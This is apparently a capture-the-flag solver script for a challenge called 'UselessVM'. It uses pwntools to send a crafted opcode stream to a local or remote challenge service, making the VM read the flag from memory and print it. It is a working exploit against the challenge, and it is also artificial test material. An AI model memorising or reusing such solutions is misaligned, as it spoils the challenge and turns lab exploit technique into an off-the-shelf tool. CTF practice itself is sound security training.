#!/usr/bin/env python3
# UselessVM solver.
#
# The challenge is a tiny stack-less "VM" that reads opcodes from stdin. The
# flag is loaded into VM memory at address 0xe080. By emitting the right opcode
# stream we point the M register at the flag and PUT_CHAR it byte-by-byte into
# the output buffer, which the VM prints (as a Rust {:?}-escaped CString) when
# gracefully HALTed.
#
# `pwnmake check` runs this against the locally started (or REMOTE=1) service.
import os
from pwn import remote, context

context.log_level = "error"


def add_low(value):
    assert 0 <= value <= 0b1_1111
    return (0b0010_0000 | value).to_bytes(1, "little")


def add_high(value):
    assert 0 <= value <= 0b1_1111
    return (0b0100_0000 | value).to_bytes(1, "little")


def put_char():
    return 0b0110_0000.to_bytes(1, "little")


def move_A_to_M():
    return 0b1110_0000.to_bytes(1, "little")


def halt():
    return 0b1000_0000.to_bytes(1, "little")


def build_program():
    prog = b""
    # Get address of flag (0xe080) into A.
    #   low byte  0x80 = 128 = 31*4 + 4
    prog += add_low(31) * 4
    prog += add_low(4)
    #   high byte 0xe0 = 224 = 31*7 + 7
    prog += add_high(31) * 7
    prog += add_high(7)

    # Walk the flag: M = A, output *M, A += 1. Flag length is unknown, so just
    # read a generous 40 bytes.
    for _ in range(40):
        prog += move_A_to_M()
        prog += put_char()
        prog += add_low(1)
    prog += halt()
    return prog


def main():
    host = os.environ.get("HOST", "localhost")
    port = int(os.environ.get("PORT", "21101"))

    io = remote(host, port)
    io.send(build_program())
    # The VM prints the escaped output buffer on HALT.
    data = io.recvall(timeout=5)
    io.close()
    print(data.decode("utf-8", errors="replace"))


if __name__ == "__main__":
    main()
